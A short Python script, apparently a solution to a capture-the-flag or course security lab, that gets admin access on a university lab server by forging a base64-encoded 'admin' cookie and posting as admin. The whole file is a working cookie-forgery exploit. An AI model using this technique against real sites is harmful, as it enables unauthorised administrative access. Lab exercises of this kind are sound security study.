import requests
import base64

SERVER = "http://mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25056

url = f"{SERVER}:{PORT}"

s = requests.Session()

# Get page -> receives cookie
r = s.get(url)

# Set admin cookie
s.cookies.set("user", base64.b64encode(b'admin').decode())
r = s.post(url, data={'username': 'admin'})
print( r.text)